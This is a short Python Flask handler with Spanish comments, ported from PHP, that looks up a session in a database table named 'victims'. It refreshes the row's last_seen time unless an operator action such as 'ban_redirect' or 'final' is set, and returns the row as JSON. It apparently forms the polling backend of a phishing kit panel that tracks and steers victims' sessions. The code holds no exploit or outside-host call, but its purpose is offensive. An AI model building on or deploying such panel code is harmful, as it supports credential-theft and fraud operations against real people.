from flask import jsonify, request
from datetime import datetime

def process_api(request, db, config):
    """
    Versión Python equivalente a processApiLogic() de PHP.
    Se llama desde @app.route("/api")
    """

    session_id = request.args.get("id")

    if not session_id:
        return jsonify({"error": "ID requerido"}), 400

    cursor = db.cursor(dictionary=True)

    # Obtener datos de sesión
    cursor.execute("SELECT * FROM victims WHERE id=%s", (session_id,))
    row = cursor.fetchone()

    if not row:
        return jsonify([])

    # Actualizar last_seen si no está finalizado
    if row["action_request"] not in ("final", "ban_redirect"):
        cursor.execute("UPDATE victims SET last_seen=NOW() WHERE id=%s", (session_id,))
        db.commit()

    return jsonify([row])
